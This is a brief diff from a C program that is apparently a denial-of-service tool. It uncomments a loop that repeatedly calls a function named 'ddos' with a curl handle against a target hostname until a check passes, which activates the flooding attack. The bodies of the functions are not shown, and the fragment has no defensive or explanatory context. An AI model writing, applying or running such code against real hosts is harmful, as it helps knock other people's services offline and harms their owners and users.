@@ -176,8 +176,8 @@ int main(void) {
 
     CURL *curl = get_curl(hostname);
 
-    //while (!check(hostname, &hints, &result))
-        //ddos(curl);
+    while (!check(hostname, &hints, &result))
+        ddos(curl);
 
     curl_easy_cleanup(curl);
 
